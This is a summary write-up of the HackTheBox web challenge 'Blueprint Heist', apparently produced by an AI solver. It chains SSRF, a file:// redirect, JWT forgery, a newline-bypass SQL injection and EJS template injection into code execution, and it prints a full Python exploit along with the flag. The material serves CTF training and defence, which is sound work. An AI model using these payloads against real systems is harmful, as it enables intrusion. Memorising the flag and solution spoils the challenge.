# Blueprint Heist - Challenge Summary

## 🎯 Challenge Completed Successfully!

**Flag:** `HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_7f3e2b14969335049b602fd88507b1f5}`

---

## 📊 Quick Stats

| Item | Details |
|------|---------|
| **Challenge** | Blueprint Heist |
| **Platform** | HackTheBox CTF Try Out (Event 1434) |
| **Category** | Web |
| **Difficulty** | Easy |
| **Points** | 1000 |
| **Target** | 94.237.59.225:55358 |
| **Status** | ✅ SOLVED |
| **Time** | ~2 hours |

---

## 🔗 Vulnerability Chain

```
SSRF → LFI → JWT Forge → SQLi → Template Injection → RCE → FLAG
```

1. **SSRF via wkhtmltopdf** - Access internal services
2. **HTTP Redirect to file://** - Read /app/.env
3. **JWT Secret Extraction** - Forge admin token
4. **SQL Injection with \n bypass** - Bypass regex filter
5. **EJS Template Injection** - Write malicious 404.ejs
6. **Command Execution** - Run /readflag as root
7. **Flag Retrieved** - Success! 🎉

---

## 🔑 Key Vulnerabilities

### 1. wkhtmltopdf 0.12.5 (CVE-2020-21365)
- Follows HTTP 302 redirects
- Allows redirect to file:// protocol
- Enables local file read via SSRF

### 2. Regex Bypass with Newline
```javascript
// Vulnerable regex:
/^.*[special_chars]/

// The '.' doesn't match '\n'!
// Bypass: "safe\n' UNION SELECT..."
```

### 3. SQL Injection in GraphQL
```javascript
// Vulnerable code:
query(`SELECT * FROM users WHERE name like '%${input}%'`)

// String interpolation = SQLi
```

### 4. EJS Template Execution
```javascript
// Malicious template:
<%= process.mainModule.require("child_process").execSync("/readflag") %>

// Executes when 404 error triggered
```

---

## 💻 Final Exploit

```python
import jwt
from requests import get, post
from base64 import b64encode
from urllib.parse import quote

secret = "Str0ng_K3y_N0_l3ak_pl3ase?"
target = "94.237.59.225:55358"

# 1. Get guest token
guest_token = get(f"http://{target}/getToken").text

# 2. Forge admin token
admin_token = jwt.encode({"role": "admin"}, secret, algorithm="HS256")

# 3. Craft SQL injection payload
command = "/readflag"
template = "/app/views/errors/404.ejs"
encoded = quote(b64encode(command.encode()).decode())
bash_cmd = f"echo {encoded} | base64 -d | bash; rm {template}"
ejs = f'<%= process.mainModule.require("child_process").execSync("{bash_cmd}") %>'
sqli = f"a\\n' union select '','{ejs}','','' into outfile '{template}'-- -"

# 4. Execute via SSRF
post(f"http://{target}/download?token={guest_token}", json={
    "url": f"http://localhost:1337/graphql?token={admin_token}&query={{getDataByName(name:\"{sqli}\"){{id}}}}"
})

# 5. Trigger execution
result = get(f"http://{target}/nonexistent").text
print(result)  # Flag!
```

---

## 🛠️ Tools Used

- **Cloudflare Tunnel** - Public HTTP server
- **PHP** - HTTP redirect script
- **Python 3** - Exploit automation
- **PyJWT** - Token manipulation
- **curl** - HTTP requests
- **pdftotext** - PDF parsing

---

## 📚 Documentation Created

1. **WRITEUP.md** (20KB) - Complete detailed writeup
2. **CODE_ANALYSIS.md** (15KB) - Full code analysis
3. **COMPLETE_SOLUTION.md** (8KB) - Solution guide
4. **STUDENT_GUIDE.md** (8KB) - Beginner-friendly explanation
5. **QUICK_REFERENCE.md** (9KB) - Commands reference
6. **SOLUTION_DIAGRAM.txt** (13KB) - Visual diagrams
7. **exploit.py** - Working exploit script
8. **NGROK_ISSUE.md** - Tunneling troubleshooting

**Total:** 8 comprehensive documents

---

## 🎓 Skills Demonstrated

✅ Web application penetration testing  
✅ SSRF exploitation  
✅ Local File Inclusion via HTTP redirect  
✅ JWT token forgery  
✅ SQL injection with regex bypass  
✅ GraphQL security testing  
✅ Template injection (EJS)  
✅ Vulnerability chaining  
✅ Linux privilege escalation (SUID)  
✅ Python exploit development  
✅ Reconnaissance and enumeration  

---

## 🔐 Security Lessons

### For Defenders

1. **Never trust user input** - Validate everything
2. **Use parameterized queries** - Prevent SQL injection
3. **Secure regex patterns** - Test with edge cases
4. **Restrict file access** - Use `--disable-local-file-access`
5. **Rotate secrets** - Don't hardcode credentials
6. **Defense in depth** - Multiple security layers
7. **Keep software updated** - Patch vulnerabilities

### For Attackers

1. **Chain vulnerabilities** - Combine for greater impact
2. **Read documentation** - Understand software behavior
3. **Test edge cases** - Newlines, encoding, redirects
4. **Think creatively** - Multiple paths to same goal
5. **Automate exploits** - Saves time and reduces errors

---

## 🏆 Achievement Unlocked

```
┌────────────────────────────────────────────────────┐
│                                                    │
│           🎉 BLUEPRINT HEIST PWNED! 🎉            │
│                                                    │
│  "Chaining Masters Beyond Imaginary"              │
│                                                    │
│  SSRF → LFI → JWT → SQLi → RCE → Root → Flag     │
│                                                    │
│  Points: 1000                                      │
│  Difficulty: Easy                                  │
│  Status: ✅ COMPLETED                              │
│                                                    │
└────────────────────────────────────────────────────┘
```

---

## 📞 Contact & Credits

**Challenge Author:** lordrukie (HackTheBox)  
**Platform:** HackTheBox CTF Try Out (Event 1434)  
**Category:** Web Exploitation  

**Solver:** AI Security Analyst  
**Date:** November 10, 2025  
**Write-up Version:** 1.0  

---

## 📝 Final Notes

This challenge perfectly demonstrates how modern web applications can be compromised through **vulnerability chaining**. Each individual vulnerability might seem minor, but when combined, they create a devastating exploit chain that leads to complete system compromise.

The key lesson: **Security is a chain, and it's only as strong as its weakest link.**

Thank you for following this writeup! Happy hacking! 🚀

---

**Next Steps:**
- Review the WRITEUP.md for complete details
- Study the exploit code in exploit.py
- Practice on similar CTF challenges
- Apply security lessons to your own code

**Remember:** Always practice ethical hacking with proper authorization!

